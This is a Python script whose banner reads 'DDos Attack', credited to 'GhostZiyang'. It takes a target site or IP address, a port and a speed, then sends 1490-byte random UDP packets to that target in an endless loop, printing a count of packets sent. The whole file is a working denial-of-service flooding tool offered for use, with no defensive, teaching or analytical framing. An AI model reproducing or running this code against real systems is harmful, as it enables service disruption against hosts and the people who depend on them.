# python3

import sys
import os
import time
import socket
import random
#Code Time
from pyfiglet import figlet_format
from colorama import Fore
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
print(Fore.RED+ figlet_format("DDos Attack"))
print(Fore.GREEN +"Ddos Attack"+Fore.CYAN+' Written By'+Fore.YELLOW+" GhostZiyang")
siteorip=input("will you DDOS a site or an ip address?[site/ip]  ")
if siteorip=="ip":
    ip = input("IP     : ")
elif siteorip=="site":
    from socket import gethostbyname
    ip = gethostbyname(input("site name?  "))
print("you will ddos ",ip)
port=int(input("port    :"))
sd=int(input("ddos speed(1-1000)   :"))

os.system("clear")

sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     print ("you have been sent %s package to ip %s port %d"%(sent,ip,port))
     time.sleep((1000-sd)/2000)

